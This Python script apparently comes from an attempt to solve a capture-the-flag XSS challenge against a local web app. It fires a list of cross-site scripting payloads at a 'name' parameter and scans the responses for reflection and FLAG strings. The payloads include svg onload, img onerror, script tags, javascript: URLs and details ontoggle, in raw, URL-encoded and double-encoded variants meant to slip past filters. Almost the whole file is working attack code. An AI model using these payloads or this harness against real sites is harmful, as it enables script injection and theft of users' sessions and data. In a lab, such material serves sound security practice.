import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:33203/page"

# Testing variations that might actually execute and validate
execution_focused_payloads = [
    # The exact requirement: alert('XSS')
    ("Plain SVG onload", "<svg onload=alert('XSS')>", "plain_svg"),
    
    # URL encoded versions that made it through before
    ("URL encoded SVG", "%3Csvg%20onload%3Dalert(%27XSS%27)%3E", "url_svg"),
    
    # Double URL encoded
    ("Double URL encoded", "%253Csvg%2520onload%253Dalert%2528%2527XSS%2527%2529%253E", "double_url"),
    
    # Different case variations that might slip through
    ("Mixed case SVG", "%3CsvG%20oNloAd%3Dalert(%27XSS%27)%3E", "mixed_url"),
    
    # Without spaces
    ("No space", "%3Csvg/onload=alert('XSS')%3E", "no_space_url"),
    
    # Using other tags that might work
    ("IMG onerror URL", "%3Cimg%20src=/%20onerror=alert('XSS')%3E", "img_url"),
    
    # Script tag variations
    ("Script tag", "%3Cscript%3Ealert('XSS')%3C/script%3E", "script_url"),
    
    # Body onload
    ("Body onload URL", "%3Cbody%20onload=alert('XSS')%3E", "body_url"),
    
    # Anchor with javascript
    ("Anchor JS", '%3Ca%20href="javascript:alert(%27XSS%27)"%3Eclick%3C/a%3E', "anchor_url"),
    
    # Using details/summary
    ("Details ontoggle", "%3Cdetails%20open%20ontoggle=alert('XSS')%3E", "details_url"),
    
    # Video tag
    ("Video onerror", "%3Cvideo%3E%3Csource%20onerror=alert('XSS')%3E", "video_url"),
    
    # Object tag
    ("Object data", "%3Cobject%20data=javascript:alert('XSS')%3E", "object_url"),
    
    # Using marquee
    ("Marquee", "%3Cmarquee%20onstart=alert('XSS')%3EXSS%3C/marquee%3E", "marquee_url"),
]

print("[*] Testing Execution-Focused XSS Payloads")

all_results = []

for test_name, payload, test_id in execution_focused_payloads:
    print(f"\n[+] Testing: {test_name}")
    print(f"    [RAW] {payload}")
    
    try:
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        payload_reflected = payload in response.text
        # Check decoded version too
        decoded_in_response = False
        try:
            decoded_payload = urllib.parse.unquote(payload)
            decoded_in_response = decoded_payload in response.text
        except:
            pass
            
        response_length = len(response.content)
        
        # Check for exact alert string
        has_exact_alert = "alert('XSS')" in response.text or 'alert("XSS")' in response.text
        
        # Check for FLAG patterns
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        print(f"    [STATUS]  {response.status_code}")
        print(f"    [LENGTH]  {response_length} bytes")
        print(f"    [REFLECT] Raw: {payload_reflected}, Decoded: {decoded_in_response}")
        print(f"    [ALERT]   Exact alert found: {has_exact_alert}")
        
        # Analyze the response
        if 'error_star.png' in response.text:
            print(f"    [STAR]    Error star - Validation failed")
            # Check if we can see the reflected payload in the error message
            if payload_reflected or decoded_in_response:
                print(f"    [REFLECT] Payload was reflected in error response")
            result_status = "VALIDATION_FAIL"
        elif 'new_star.png' in response.text:
            print(f"    [STAR]    New star - Filtered")
            result_status = "FILTERED"
        elif 'Let the game begin' in response.text:
            print(f"    [STAR]    Filtered - Default message")
            result_status = "FILTERED"
        elif 'Success' in response.text or 'FLAG' in response.text:
            print(f"    [!!]      SUCCESS OR FLAG DETECTED!")
            result_status = "SUCCESS"
            print(f"    [RESPONSE]: {response.text}")
        else:
            # Check response content for clues
            print(f"    [RESPONSE]: {response.text[:300]}")
            result_status = "UNKNOWN"
        
        if flag_patterns:
            print(f"    [!!]      FLAG DETECTED: {flag_patterns}")
        
        all_results.append({
            'test_name': test_name,
            'raw_payload': payload,
            'status': response.status_code,
            'length': response_length,
            'exact_alert': has_exact_alert,
            'flags': flag_patterns,
            'result_status': result_status,
            'decoded_reflected': decoded_in_response
        })
        
    except Exception as e:
        print(f"    [ERROR]   {str(e)}")
        all_results.append({
            'test_name': test_name,
            'error': str(e)
        })

# Summary
print("\n" + "="*80)
print("[*] EXECUTION TEST SUMMARY")
print("="*80)

validation_fails = []
successes = []
filtered = []

for result in all_results:
    if 'error' in result:
        continue
        
    status = result['result_status']
    print(f"[{status:18}] {result['test_name']:<25} | Exact alert: {result['exact_alert']}")
    
    if result['result_status'] == 'SUCCESS':
        successes.append(result)
    elif result['result_status'] == 'VALIDATION_FAIL':
        validation_fails.append(result)
    elif result['result_status'] == 'FILTERED':
        filtered.append(result)

print(f"\n[*] Totals: Success={len(successes)}, Validation Fail={len(validation_fails)}, Filtered={len(filtered)}")

# Show validation failures in detail (most interesting)
if validation_fails:
    print(f"\n[*] Validation Failures (payload reached but didn't execute correctly):")
    print("-" * 80)
    for result in validation_fails:
        print(f"\n[+] {result['test_name']}:")
        print(f"    Raw payload: {result['raw_payload'][:80]}")
        print(f"    Exact alert in response: {result['exact_alert']}")
        print(f"    Decoded reflected: {result['decoded_reflected']}")

print("\n[*] Testing complete")
